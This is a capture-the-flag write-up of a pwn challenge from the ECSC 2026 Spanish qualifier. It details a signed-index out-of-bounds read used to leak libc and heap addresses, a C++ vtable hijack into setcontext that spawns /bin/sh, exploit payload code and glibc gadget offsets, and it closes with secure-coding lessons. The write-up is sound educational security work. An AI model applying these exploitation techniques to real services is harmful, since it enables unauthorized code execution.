@@ -1,0 +1,298 @@
+---
+title: "Reto09_SecureDataVault"
+description: "A zip with a stripped x86-64 C++ binary (vuln), a bare FROM ubuntu:22.04 Dockerfile and the xinetd wrapper that serves it, plus a remote service on port 20009."
+date: 2026-08-04T12:12:00.000Z
+tags: ["ctf", "pwn", "ecsc26"]
+ctf: "ECSC 2026 Spanish Qualifier (INCIBE)"
+category: "Pwn"
+---
+
+**CTF:** ECSC 2026 Spanish Qualifier (INCIBE)  
+**Category:** Pwn  
+**Difficulty:** 1600  
+
+## Challenge
+
+A zip with a stripped x86-64 C++ binary (`vuln`), a bare `FROM ubuntu:22.04` Dockerfile and the
+xinetd wrapper that serves it, plus a remote service on port 20009. No libc ships in the zip, so I
+built the image and pulled the libc out of the container: glibc 2.35-0ubuntu3.14. The binary is a
+menu-driven "Secure Core Data Vault Console" with five options: add a user, export an object as hex,
+import an object from hex, run an admin action, exit. Full RELRO, canary, NX, PIE, and the menu
+handler is control-flow flattened.
+
+## Solution
+
+### Reading through the obfuscation
+
+Ghidra hands back one 3575-byte function with a state variable and a dispatch loop, which is the
+usual LLVM flattening pass:
+
+```c
+local_180 = 0x9a7b21e0;          // menu print
+...
+if (local_19c == 2) { local_180 = 0x1002; goto LAB_001028c0; }   // export
+```
+
+There is also a bogus block designed to waste your time:
+
+```c
+sVar7 = strlen(local_108);
+if ((int)sVar7 * 7 == 0x99a6) {
+    "Bogus path hit!"
+}
+```
+
+0x99a6 is 39334, which is not a multiple of 7, so that branch can never be taken. Once you map the
+state constants to the five menu entries the logic is small and boring, and the whole thing fits on
+one screen.
+
+The object is what matters:
+
+```c
+puVar5 = operator_new(0x70);
+*puVar5 = &PTR_FUN_00105cb0;     // +0x00 vtable
+puVar5[1] = puVar5;              // +0x08 SELF POINTER
+strncpy((char *)(puVar5 + 2), local_108, 0x1f);   // +0x10 name
+strncpy((char *)(puVar5 + 6), local_c8,  0x3f);   // +0x30 bio
+```
+
+Import allocates its own `operator_new(0x70)`, writes the self pointer into `+0x08` first, and then
+copies 13 of the 14 qwords of my hex payload over it, skipping qword 1 entirely. So I control every
+field except `+0x08`, which always ends up holding the object's own address. That looked like the
+main obstacle at first. It is the opposite: it means `export` on any object I imported reads that
+object's true heap address straight back to me. Nothing in this exploit ever has to be guessed.
+
+### The libc leak off one signed comparison
+
+Export's bounds check is a single line:
+
+```c
+iVar4 = (int)strtol(local_128, NULL, 10);
+if (0xf < iVar4) goto LAB_001031b0;                        // "Index out of bounds"
+if (*(long *)(&DAT_00106300 + (long)iVar4 * 8) != 0) {
+    FUN_00102550(*(undefined8 *)(&DAT_00106300 + (long)iVar4 * 8), 0x70);   // hexdump 0x70 bytes
+```
+
+Upper bound only, on a signed int. Negative indices walk backwards out of the object table at
+PIE+0x6300 through the rest of the image, and the code *dereferences* the slot before dumping it,
+so any relocated pointer sitting below the table becomes a 0x70-byte read window wherever it points.
+
+```python
+ARRAY = 0x6300
+def IDX(addr): return (addr - ARRAY) // 8
+```
+
+| index | slot | what the dereference dumps |
+|---|---|---|
+| -88 | 0x6040 | `stdout` COPY reloc, i.e. `_IO_2_1_stdout_` itself |
+| -94 | 0x6010 | 0x6018..0x6088, end of .data into .bss: `puts`, `stdout`, `stdin`, `cout`'s vptr |
+| -114 | 0x5f70 | `__stack_chk_fail` entry bytes |
+| -164 | 0x5de0 | DT_PLTGOT, so the GOT itself |
+| -166 | 0x5dd0 | DT_DEBUG, so `r_debug` and the ld.so base |
+| -202 | 0x5cb0 | vtable[0], code at PIE+0x38f0 |
+
+Index -88 was the one I needed on the first pass. `_IO_2_1_stdout_`'s `_chain` at +0x68 is a libc
+pointer, and `chain - libc.sym._IO_2_1_stdin_` gives a page-aligned base every time. The libc base
+is the only one that needs this bug: PIE comes from `export(0)`, an ordinary in-bounds read of a
+real object's vtable pointer, and every heap address comes from the forced self pointer at `+0x08`
+of an in-bounds export.
+
+```python
+pie  = u64(v.export(0)[0:8]) - 0x5cb0
+libc.address = u64(v.export(-88)[0x68:0x70]) - libc.symbols["_IO_2_1_stdin_"]
+```
+
+The `.dynamic` windows are worth calling out separately, because those two entries reach their
+runtime values by different routes. DT_PLTGOT holds 0x5ef8 in the file, and glibc's
+`elf_get_dynamic_info()` adds the load bias to `d_ptr` in place, so at runtime the entry points at
+the real GOT. DT_DEBUG's `d_un` is a literal 0 in the file; the loader writes the address of its own
+`r_debug` into it during startup. Either way the slot ends up holding a live pointer, so index -164
+dumps the GOT and index -166 dumps `r_debug`, ld.so base included. That is what let me settle the
+remote question later.
+
+### The trap in the admin action
+
+The binary has 24 `call rax` sites. One is `.init` reaching `__gmon_start__`; twenty-two are the
+compiler's speculative devirtualization of `std::ctype<char>::do_widen`, emitted wherever a
+character gets widened for a stream. Menu 4's site at 0x36f0 is the only indirect call in the binary
+whose target I control. From the disassembly:
+
+```asm
+test  eax, eax ; js  0x31b0            ; "Index out of bounds"
+cdqe ; cmp rax, [0x62e0] ; jae 0x31b0  ; "Index out of bounds"
+lea   rdx, [0x6300]                    ; object table
+mov   rdi, [rdx + rax*8]               ; obj
+lea   rdx, [0x3770]                    ; DatabaseObject::adminAction
+mov   rax, [rdi]                       ; vtable
+mov   rax, [rax + 8]                   ; vtable[1]
+cmp   rax, rdx ; jne 0x36f0            ; 0x36f0: call rax   (rdi = obj)
+<inlined body of DatabaseObject::adminAction>
+```
+
+That `cmp`/`jne` is the same devirtualization idiom as the `do_widen` sites, and it is inverted
+relative to what anyone would expect a security check to look like. A *match* takes the inlined path
+and prints "Executing privileged admin diagnostics..." without calling anything. A *mismatch* falls
+through to an unguarded `call rax` with `rdi` pointing at my object. Legitimate objects take the
+mismatch path too: the real vtable's second entry is PIE+0x3830, which prints "Executing standard
+user diagnostics...".
+
+So the single value that is filtered is PIE+0x3770, the privileged admin function. Point a fake
+vtable at it and you get a congratulatory message and no execution, which reads exactly like
+success. I burned a probe on that. `behav.py` settled it by pointing vtable[1] at PIE+0x38f0, the
+object's display method, instead: it echoed my own marker bytes back out of `+0x10` and `+0x30`,
+proving the call fired with `rdi` under my control.
+
+Note also that menu 4 checks `js` and `jae` against the counter, and import has no index at all
+(it always stores at `table[count]`, capped at 16). The negative-index bug exists in export and
+nowhere else, and there is no write primitive anywhere in the binary. The vtable hijack is the only
+code execution path.
+
+### Where the first chain died
+
+`call *(vptr[1])` with `rdi = obj` and a 0x70-byte fully controlled object is not a stack pivot on
+its own. The obvious first stage was:
+
+```asm
+G1 = libc+0x167490   mov rdx,[rdi+8] ; mov [rsp],rax ; call [rdx+0x20]
+```
+
+`[rdi+8]` is the forced self pointer, so `rdx` becomes the object's own address, and then it calls
+through `*(obj+0x20)`, which I control. Chain that into `setcontext+61` (past the `fldenv` /
+`ldmxcsr` pair) and `setcontext` reads `rdi` from `[rdx+0x68]`, `rsp` from `[rdx+0xa0]` and `rip`
+from `[rdx+0xa8]`. Shell on the local Docker replica.
+
+Remotely it returned to the menu, or died with "stack smashing detected". My hypothesis at the time
+was indirect branch tracking: G1 and `setcontext+61` are both mid-function targets with no `endbr64`
+in front of them, while every entry point I had dispatched to had worked. So I threw the first stage
+away and rebuilt the chain out of entry points only. That is what got the shell, and the hypothesis
+behind it was still wrong. I did not find that out until afterwards.
+
+### The chain that does not care
+
+`setcontext`'s own prologue does what G1 was doing:
+
+```asm
+endbr64 ; push %rdi ; lea 0x128(%rdi),%rsi ; ... syscall (rt_sigprocmask) ; pop %rdx
+```
+
+It derives `rdx` from `rdi` by itself. Since the admin call already hands it `rdi = obj`, calling
+`setcontext` at its entry needs no first stage whatsoever, and `setcontext` sits at 0x539e0 in every
+2.35-0ubuntu3 build I compared. The cost is that the full entry path also touches `0x128(%rdx)` as a
+sigset, `0xe0(%rdx)` as an x87 environment pointer for `fldenv`, and `0x1c0(%rdx)` as an MXCSR
+value, all of which have to be sane.
+
+They are all past the end of a 0x70 object. Consecutive imports land at a fixed 0x80 stride, so
+those fields fall inside the next four objects, which I also control:
+
+| field | offset from A | lands in | value |
+|---|---|---|---|
+| fake vptr | A+0x00 | O0+0x00 | A+0x10 |
+| vtable[1] | A+0x18 | O0+0x18 | `setcontext` entry |
+| rdi | A+0x68 | O0+0x68 | `/bin/sh` |
+| rsp | A+0xa0 | O1+0x20 | heap scratch, 8 mod 16 |
+| rip | A+0xa8 | O1+0x28 | `system` |
+| fpu env ptr | A+0xe0 | O1+0x60 | O4+0x10 |
+| sigset | A+0x128 | O2+0x28 | zeroes |
+| MXCSR | A+0x1c0 | O3+0x40 | 0 (a legal value) |
+
+```python
+o0 = bytearray(0x70)
+o0[0x00:0x08] = p64(A + 0x10)     # vptr -> vtable[1] = *(A+0x18)
+o0[0x18:0x20] = p64(setctx)       # called with rdi = A
+o0[0x68:0x70] = p64(binsh)        # setcontext: rdi
+
+o1 = bytearray(0x70)
+o1[0x20:0x28] = p64(A + 0x1008)   # rsp
+o1[0x28:0x30] = p64(system)       # rip
+o1[0x60:0x68] = p64(A + 0x210)    # fldenv source -> O4+0x10
+
+o4 = bytearray(0x70)
+o4[0x10:0x14] = (0x037F).to_bytes(4, "little")   # x87 control word
+o4[0x18:0x1C] = (0xFFFF).to_bytes(4, "little")   # tag word
+```
+
+`A` is not a guess. I import two throwaway objects, read their forced self pointers back through
+export to measure the stride, and predict where the next one lands, then assert on the real address
+afterwards:
+
+```python
+_, a1 = v.imp_at(bytes(0x70))
+_, a2 = v.imp_at(bytes(0x70))
+S = a2 - a1
+A = a2 + S
+...
+assert addrs[0] == A
+for k in range(1, 5):
+    assert addrs[k] == A + k * S
+```
+
+Import the five objects in order, fire menu 4 on O0, and `setcontext` walks its own fields out of my
+heap and lands on `system("/bin/sh")`.
+
+### The postmortem: it was never branch tracking
+
+Afterwards I went back with the DT_PLTGOT and `puts`/`stdout` windows above and measured the
+deployed libc against the one out of my container:
+
+```text
+LOCAL   puts = +0x80e10   setvbuf = +0x815b0   (glibc 2.35-0ubuntu3.14)
+REMOTE  puts = +0x80e50   setvbuf = +0x815f0   (0x40 later, an earlier 2.35-0ubuntu3.x)
+```
+
+The deployed binary matched mine in all five code windows the image's own relative relocations let
+me read, and the libstdc++ windows matched too. Only libc differed, and by a build, not a version.
+`system` (0x50d70) and `setcontext` (0x539e0) sit at the same offset in all eleven 2.35-0ubuntu3
+builds I compared, 3.4 through 3.14. `/bin/sh` is at 0x1d8678 in ten of them and at 0x1d8698 in 3.4.
+The first-stage gadget moves on its own pattern again:
+
+```text
+G1 = mov rdx,[rdi+8] ; mov [rsp],rax ; call [rdx+0x20]
+  0x167230  3.5
+  0x167420  3.6 3.7 3.8 3.9 3.10
+  0x167490  3.11 3.12 3.14 (local)
+  0x1674d0  3.13
+  0x167610  3.4
+```
+
+Hardcoding 0x167490 meant `call rax` landed on unrelated bytes. That is the whole failure, and both
+symptoms fall out of it: sometimes a harmless instruction that returns, sometimes a partial run that
+corrupts the frame. Throwing the first stage away had dodged a moving gadget, not a branch-tracking
+policy.
+
+Fingerprinting the build over the wire is the direct fix for the original chain. `__stack_chk_fail`'s
+first 0x70 bytes, reachable through its GOT slot at 0x5f70 (index -114), open with the same
+`endbr64 ; push rax ; pop rax` in all eleven builds, but the `lea rdi,[rip+X]` that starts at offset
+6 carries a displacement that takes six distinct values (0xa5379 in the shipped 3.14, 0xa53b9 across
+3.6 to 3.10), and each of those six pins exactly one G1 offset. `pwn09b.py` leaks, fingerprints, picks G1 and runs the chain;
+it reaches a shell on the local replica. The remote had stopped answering by the time it existed, so
+that variant was never fired at the real target.
+
+Flag: `flag{ECSC2026_llvm_obfuscated_vtable_hijack_vrop_production_key}`
+
+## Takeaway
+
+Two bugs, one lesson each.
+
+The export index is a signed `int` compared only against an upper bound. `if (0xf < (int)idx)`
+looks like a bounds check and is half of one. Any index taken from user input should be read into an
+unsigned type and checked against both ends, or checked as `if (idx < 0 || idx >= n)` before it ever
+reaches pointer arithmetic. The damage here was not a crash: it was that every relocated pointer in
+the image below the table turned into a 0x70-byte read window, and one of those windows, the
+`stdout` copy relocation, handed over the libc base in a single request.
+
+The admin dispatch is a devirtualization shortcut being mistaken for an authorization check.
+Comparing `vtable[1]` against the expected function and then calling it anyway when the comparison
+fails is worse than no check at all, because it prints a success message on the one input a tester
+would try. If a virtual dispatch has to be constrained, constrain the object, not the pointer:
+validate that the index refers to a live object of the expected type before touching its vtable, and
+never accept a raw object image from the network. Import here is a `memcpy` of attacker bytes over a
+polymorphic C++ object, vtable pointer included, which is game over regardless of what happens next.
+
+The operational note is the last one, and I got it backwards on the day. When an exploit works
+locally and fails remotely, measure the deployed libc before rewriting the chain. I rewrote first,
+on a branch-tracking hypothesis nothing supported, and only measured afterwards. The rewrite worked
+anyway, for a reason I had not identified: gadget offsets move within a distro patch series while
+`system` and `setcontext` do not, so a chain built out of entry points is immune to the gadget that
+actually broke me. It is not immune across the whole family, though. The base is derived from the
+local build's `_IO_2_1_stdin_` offset, which sits 0x1000 lower in 3.4 and 3.5, and 3.4 also shifts
+`/bin/sh`, so those two builds still need identifying before the chain would land.
